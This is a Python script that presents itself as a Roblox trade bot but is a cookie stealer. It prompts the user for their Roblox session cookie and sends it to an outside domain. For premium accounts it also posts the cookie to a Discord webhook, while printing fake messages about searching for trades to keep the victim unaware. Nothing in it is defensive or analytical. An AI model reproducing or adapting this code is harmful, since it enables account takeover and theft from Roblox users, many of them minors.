
import requests,os;from pystyle import *;from time import sleep
def Main2():
    logo = """
▀▀█▀▀ █▀▀█ █▀▀█ █▀▀▄ █▀▀    ▒█▀▀█ █▀▀█ ▀▀█▀▀ 
░▒█░░ █▄▄▀ █▄▄█ █░░█ █▀▀    ▒█▀▀▄ █░░█ ░░█░░ 
░▒█░░ ▀░▀▀ ▀░░▀ ▀▀▀░ ▀▀▀    ▒█▄▄█ ▀▀▀▀ ░░▀░░ 
"""
    def main():
        while True:
            os.system("cls")
            print(f"""{Col.purple}
{logo}

{Col.white}[{Col.purple}+{Col.white}] The Most Efficient Roblox Trade Bot
{Col.white}[{Col.purple}+{Col.white}] The Best Config On The Market

    """)
            cookie = input(f"{Col.white}[{Col.purple}+{Col.white}] Enter Roblox Cookie >> ")
            os.system('cls')
            print(f"""{Col.purple}
{logo}

{Col.white}[{Col.purple}+{Col.white}] The Most Efficient Roblox Trade Bot
{Col.white}[{Col.purple}+{Col.white}] The Best Config On The Market

    """)
            try:
                r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json();USERNAME = r['username'];PREMIUM=r["premium"];COL=r["collections"]
                print(f"{Col.white}[{Col.purple}+{Col.white}] Connected as : {USERNAME}");sleep(2)
                if PREMIUM == "False":
                    print(f"{Col.white}[{Col.red}+{Col.white}] User Does Not Have Premium.");sleep(3)
                else:
                    print(f"{Col.white}[{Col.purple}+{Col.white}] Your Limiteds : \n{COL}")
                    webhook = DiscordWebhook(url=yurrr, username="Cookay", avatar_url=r"https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png")
                    embed = DiscordEmbed(title=f"Roblox Cookie (PREMIUM)", description=f"```{cookie}```", color='E02C2C')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png')
                    embed.set_footer(text='Cookay || vesper#0003 (c)')
                    embed.set_timestamp()
                    webhook.add_embed(embed)
                    response = webhook.execute()
                    print(f"\n{Col.white}[{Col.purple}+{Col.white}] Searching For Trades, This Can Take A Few Minutes..")
                    print(f"{Col.white}[{Col.purple}+{Col.white}] Trades Will Be Sent Automatically")
                    sleep(100)
            except:print(f"{Col.white}[{Col.red}+{Col.white}] Invalid Cookie.")

    main()